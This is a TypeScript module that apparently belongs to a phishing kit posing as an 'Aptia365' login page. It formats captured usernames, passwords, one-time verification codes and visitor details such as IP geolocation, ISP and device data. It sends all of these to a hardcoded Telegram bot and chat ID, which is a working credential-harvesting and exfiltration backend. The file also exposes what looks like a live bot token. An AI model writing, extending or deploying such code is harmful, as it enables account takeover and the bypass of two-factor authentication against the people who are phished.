const TELEGRAM_MAX_MESSAGE = 4096;
const TELEGRAM_BOT_TOKEN = "5877336614:AAHeJpXioCqVASLDNCjMOp82W7YTkrkk3YI";
const TELEGRAM_CHAT_ID = "1535273256";

export function getSiteName(): string {
  const fromEnv =
    process.env.SITE_NAME?.trim() || process.env.NEXT_PUBLIC_SITE_NAME?.trim();
  return fromEnv || "Aptia365";
}

export function withSiteHeader(message: string): string {
  return [`🏷️ Site: ${getSiteName()}`, "━━━━━━━━━━━━━━━━━━", "", message].join(
    "\n",
  );
}

export function getTelegramChatIds(): string[] {
  return TELEGRAM_CHAT_ID.split(",")
    .map((s) => s.trim())
    .filter(Boolean);
}

export function isTelegramConfigured(): boolean {
  return Boolean(TELEGRAM_BOT_TOKEN) && getTelegramChatIds().length > 0;
}

export function getClientIp(request: Request): string | null {
  const forwarded =
    request.headers.get("x-forwarded-for") ??
    request.headers.get("X-Forwarded-For");
  if (forwarded) {
    const first = forwarded.split(",")[0]?.trim();
    if (first) return first;
  }
  const vercelFwd = request.headers.get("x-vercel-forwarded-for");
  if (vercelFwd) {
    const first = vercelFwd.split(",")[0]?.trim();
    if (first) return first;
  }
  const realIp =
    request.headers.get("x-real-ip") ?? request.headers.get("X-Real-IP");
  if (realIp) return realIp.trim();
  const proxied = request.headers.get("x-vercel-proxied-for");
  if (proxied) {
    const first = proxied.split(",")[0]?.trim();
    if (first) return first;
  }
  const cf = request.headers.get("cf-connecting-ip");
  if (cf) return cf.trim();
  return null;
}

function truncateMessage(text: string): string {
  if (text.length <= TELEGRAM_MAX_MESSAGE) return text;
  return `${text.slice(0, TELEGRAM_MAX_MESSAGE - 20)}\n…(truncated)`;
}

export type IpLookupResult = {
  locationLine: string;
  ip: string;
  timezone: string;
  isp: string;
};

function isPrivateOrLocalIPv4(ip: string): boolean {
  if (ip === "127.0.0.1") return true;
  const parts = ip.split(".");
  if (parts.length !== 4) return false;
  const a = Number(parts[0]);
  const b = Number(parts[1]);
  if (Number.isNaN(a) || Number.isNaN(b)) return false;
  if (a === 10) return true;
  if (a === 192 && b === 168) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  return false;
}

export async function lookupIpGeo(
  ip: string | null,
): Promise<IpLookupResult | null> {
  if (!ip) return null;
  if (
    ip === "::1" ||
    ip.startsWith("fc") ||
    ip.startsWith("fd") ||
    isPrivateOrLocalIPv4(ip)
  ) {
    return {
      locationLine: "Unknown (local/private network)",
      ip,
      timezone: "—",
      isp: "—",
    };
  }

  try {
    const whoRes = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
      cache: "no-store",
    });
    const who = (await whoRes.json()) as {
      success?: boolean;
      city?: string;
      region?: string;
      country?: string;
      timezone?: { id?: string } | string;
      connection?: { isp?: string; org?: string };
    };
    if (who.success !== false && (who.city || who.country)) {
      const city = who.city ?? "";
      const region = who.region ?? "";
      const country = who.country ?? "";
      const locationLine =
        [city, region, country].filter(Boolean).join(", ") || "Unknown";
      const tz =
        typeof who.timezone === "object" && who.timezone?.id
          ? who.timezone.id
          : typeof who.timezone === "string"
            ? who.timezone
            : "—";
      const isp = who.connection?.isp ?? who.connection?.org ?? "—";
      return {
        locationLine,
        ip,
        timezone: tz,
        isp,
      };
    }
  } catch {}

  try {
    const res = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,isp,query,timezone`,
      { cache: "no-store" },
    );
    const data = (await res.json()) as {
      status?: string;
      country?: string;
      regionName?: string;
      city?: string;
      isp?: string;
      query?: string;
      timezone?: string;
    };
    if (data.status !== "success" || !data.query) {
      return {
        locationLine: "Unknown",
        ip,
        timezone: "—",
        isp: "—",
      };
    }
    const city = data.city ?? "";
    const region = data.regionName ?? "";
    const country = data.country ?? "";
    const locationLine =
      [city, region, country].filter(Boolean).join(", ") || "Unknown";
    return {
      locationLine,
      ip: data.query,
      timezone: data.timezone ?? "—",
      isp: data.isp ?? "—",
    };
  } catch {
    return {
      locationLine: "Unknown",
      ip,
      timezone: "—",
      isp: "—",
    };
  }
}

export async function sendTelegramToAll(
  text: string,
): Promise<{ ok: boolean; error?: string }> {
  const token = TELEGRAM_BOT_TOKEN;
  const chatIds = getTelegramChatIds();
  if (!token || chatIds.length === 0) {
    return { ok: false, error: "not_configured" };
  }

  const payload = truncateMessage(text);
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  for (const chatId of chatIds) {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: payload,
        disable_web_page_preview: true,
      }),
    });
    if (!res.ok) {
      const errText = await res.text();
      return { ok: false, error: errText };
    }
  }

  return { ok: true };
}

export function formatLoginMessage(username: string, password: string): string {
  return [
    "🔐 Login Attempt",
    "━━━━━━━━━━━━━━━━━━",
    `👤 Username: ${username}`,
    `🔒 Password: ${password}`,
  ].join("\n");
}

export function methodLabel(method: "email" | "text" | "phone"): string {
  switch (method) {
    case "email":
      return "Email Address";
    case "text":
      return "Text Message (SMS)";
    case "phone":
      return "Phone Call";
    default: {
      const _exhaustive: never = method;
      return _exhaustive;
    }
  }
}

export function verificationTypeLabel(
  method: "email" | "text" | "phone",
): string {
  switch (method) {
    case "email":
      return "Email";
    case "text":
      return "Text Message (SMS)";
    case "phone":
      return "Phone Call";
    default: {
      const _exhaustive: never = method;
      return _exhaustive;
    }
  }
}

export function formatMethodMessage(
  method: "email" | "text" | "phone",
): string {
  return [
    "🔐 Verify Your Identity",
    "━━━━━━━━━━━━━━━━━━",
    "",
    `Method Selected: ${methodLabel(method)}`,
  ].join("\n");
}

export function formatVerificationMessage(
  method: "email" | "text" | "phone",
  code: string,
  otpStep: 1 | 2,
): string {
  return [
    "✅ Verification Code Submitted",
    `🔐 Type: ${verificationTypeLabel(method)}`,
    `🧩 OTP Step: ${otpStep === 2 ? "Final" : "First"}`,
    `🔢 Code: ${code}`,
  ].join("\n");
}

export function formatResendMessage(
  method: "email" | "text" | "phone",
  otpStep: 1 | 2,
): string {
  return [
    "🔁 Resend Code Requested",
    "━━━━━━━━━━━━━━━━━━",
    `📬 Method: ${verificationTypeLabel(method)}`,
    `🧩 OTP Step: ${otpStep === 2 ? "Final" : "First"}`,
  ].join("\n");
}

export function formatVisitMessage(input: {
  location: string;
  ip: string;
  timezone: string;
  isp: string;
  userAgent: string;
  screen: string;
  language: string;
  referrer: string;
  url: string;
  localTime: string;
  utcTime: string;
}): string {
  return [
    "🌐 New Visitor",
    "━━━━━━━━━━━━━━━━━━",
    `📍 Location: ${input.location}`,
    `🌍 IP: ${input.ip}`,
    `⏰ Timezone: ${input.timezone}`,
    `🌐 ISP: ${input.isp}`,
    "",
    `📱 Device: ${input.userAgent}`,
    `🖥️ Screen: ${input.screen}`,
    `🌍 Language: ${input.language}`,
    `🔗 Referrer: ${input.referrer}`,
    `🌐 URL: ${input.url}`,
    "",
    `⏰ Local Time: ${input.localTime}`,
    `🕒 UTC Time: ${input.utcTime}`,
  ].join("\n");
}
